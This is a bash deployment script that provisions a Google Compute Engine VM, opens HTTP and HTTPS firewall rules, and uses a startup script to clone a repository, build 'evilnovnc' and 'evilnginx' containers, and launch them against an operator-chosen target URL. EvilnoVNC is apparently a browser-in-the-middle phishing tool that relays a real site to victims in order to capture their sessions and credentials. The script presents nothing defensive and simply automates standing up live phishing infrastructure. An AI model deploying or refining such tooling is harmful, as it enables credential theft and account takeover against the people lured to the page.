#!/bin/bash
# Deploy EvilnoVNC to Google Compute Engine
# Usage: ./deploy-gce.sh [PROJECT_ID] [TARGET_URL]

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}╔════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║    EvilnoVNC - Google Compute Engine Deployment       ║${NC}"
echo -e "${BLUE}╚════════════════════════════════════════════════════════╝${NC}"
echo ""

# Check if gcloud is installed
if ! command -v gcloud &> /dev/null; then
    echo -e "${RED}✗ gcloud CLI is not installed${NC}"
    echo "Please install it from: https://cloud.google.com/sdk/docs/install"
    exit 1
fi

# Get project ID
if [ -z "$1" ]; then
    PROJECT_ID=$(gcloud config get-value project 2>/dev/null)
    if [ -z "$PROJECT_ID" ]; then
        echo -e "${RED}✗ No project ID provided and no default project set${NC}"
        echo "Usage: $0 [PROJECT_ID] [TARGET_URL]"
        exit 1
    fi
    echo -e "${YELLOW}Using current project: ${PROJECT_ID}${NC}"
else
    PROJECT_ID="$1"
    echo -e "${YELLOW}Using project: ${PROJECT_ID}${NC}"
fi

# Get target URL
if [ -z "$2" ]; then
    read -p "Enter target URL (e.g., https://example.com): " TARGET_URL
    if [ -z "$TARGET_URL" ]; then
        echo -e "${RED}✗ Target URL is required${NC}"
        exit 1
    fi
else
    TARGET_URL="$2"
fi

# Configuration
INSTANCE_NAME="evilnovnc-vm"
ZONE="us-central1-a"
MACHINE_TYPE="e2-standard-4"
BOOT_DISK_SIZE="50GB"

echo ""
echo -e "${YELLOW}Deployment Configuration:${NC}"
echo "  Project ID: ${PROJECT_ID}"
echo "  Instance Name: ${INSTANCE_NAME}"
echo "  Zone: ${ZONE}"
echo "  Machine Type: ${MACHINE_TYPE}"
echo "  Target URL: ${TARGET_URL}"
echo ""

read -p "Continue with deployment? (y/n): " -n 1 -r
echo
if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    echo "Deployment cancelled"
    exit 1
fi

# Set project
echo -e "${BLUE}[1/7] Setting project...${NC}"
gcloud config set project "${PROJECT_ID}"

# Enable required APIs
echo -e "${BLUE}[2/7] Enabling required APIs...${NC}"
gcloud services enable compute.googleapis.com

# Create firewall rules
echo -e "${BLUE}[3/7] Creating firewall rules...${NC}"
gcloud compute firewall-rules create allow-http-evilnovnc \
    --allow tcp:80 \
    --target-tags=http-server \
    --description="Allow HTTP traffic for EvilnoVNC" \
    --project="${PROJECT_ID}" 2>/dev/null || echo "  Firewall rule already exists"

gcloud compute firewall-rules create allow-https-evilnovnc \
    --allow tcp:443 \
    --target-tags=https-server \
    --description="Allow HTTPS traffic for EvilnoVNC" \
    --project="${PROJECT_ID}" 2>/dev/null || echo "  Firewall rule already exists"

# Create the VM instance
echo -e "${BLUE}[4/7] Creating VM instance...${NC}"
gcloud compute instances create "${INSTANCE_NAME}" \
    --project="${PROJECT_ID}" \
    --zone="${ZONE}" \
    --machine-type="${MACHINE_TYPE}" \
    --image-family=cos-stable \
    --image-project=cos-cloud \
    --boot-disk-size="${BOOT_DISK_SIZE}" \
    --boot-disk-type=pd-standard \
    --tags=http-server,https-server \
    --metadata=TARGET_URL="${TARGET_URL}",startup-script='#!/bin/bash
# Install Docker (if not already installed)
if ! command -v docker &> /dev/null; then
    echo "Installing Docker..."
    # Container-Optimized OS has Docker pre-installed
    echo "Docker is pre-installed in COS"
fi

# Clone and setup
cd /home
if [ -d "flashedcook" ]; then
    echo "Repository already exists, updating..."
    cd flashedcook
    git pull || echo "Warning: Could not update repository"
else
    if ! git clone https://github.com/therealelyayo/flashedcook.git; then
        echo "Error: Failed to clone repository"
        exit 1
    fi
    cd flashedcook
fi

# Build images
docker build -f evilnovnc.Dockerfile -t evilnovnc .
docker build -f nginx.Dockerfile -t evilnginx .

# Setup Downloads directory
mkdir -p Downloads
chown -R 103 Downloads

# Run the application
TARGET_URL=$(curl -s "http://metadata.google.internal/computeMetadata/v1/instance/attributes/TARGET_URL" -H "Metadata-Flavor: Google")
nohup ./start_auto.sh "${TARGET_URL}" > /tmp/evilnovnc.log 2>&1 &
' || {
    echo -e "${RED}✗ Failed to create VM instance${NC}"
    exit 1
}

# Wait for instance to be ready
echo -e "${BLUE}[5/7] Waiting for instance to be ready...${NC}"
sleep 10

# Get external IP
echo -e "${BLUE}[6/7] Getting external IP...${NC}"
EXTERNAL_IP=$(gcloud compute instances describe "${INSTANCE_NAME}" \
    --zone="${ZONE}" \
    --project="${PROJECT_ID}" \
    --format='get(networkInterfaces[0].accessConfigs[0].natIP)')

if [ -z "$EXTERNAL_IP" ]; then
    echo -e "${RED}✗ Failed to get external IP${NC}"
    exit 1
fi

echo -e "${BLUE}[7/7] Waiting for application to start (this may take 2-3 minutes)...${NC}"
echo "  Building Docker images and starting containers..."
sleep 120

# Check if application is accessible
echo ""
echo -e "${GREEN}═══════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}✓ Deployment completed successfully!${NC}"
echo -e "${GREEN}═══════════════════════════════════════════════════════${NC}"
echo ""
echo -e "${YELLOW}Application Details:${NC}"
echo "  External IP: ${EXTERNAL_IP}"
echo "  Access URL: http://${EXTERNAL_IP}"
echo "  Target URL: ${TARGET_URL}"
echo ""
echo -e "${YELLOW}Useful Commands:${NC}"
echo "  SSH into VM:"
echo "    gcloud compute ssh ${INSTANCE_NAME} --zone=${ZONE}"
echo ""
echo "  View logs:"
echo "    gcloud compute ssh ${INSTANCE_NAME} --zone=${ZONE} --command='sudo docker logs evilnginx'"
echo ""
echo "  Stop VM:"
echo "    gcloud compute instances stop ${INSTANCE_NAME} --zone=${ZONE}"
echo ""
echo "  Delete VM:"
echo "    gcloud compute instances delete ${INSTANCE_NAME} --zone=${ZONE}"
echo ""
echo -e "${YELLOW}Note: It may take 2-3 minutes for the application to be fully accessible${NC}"
echo ""
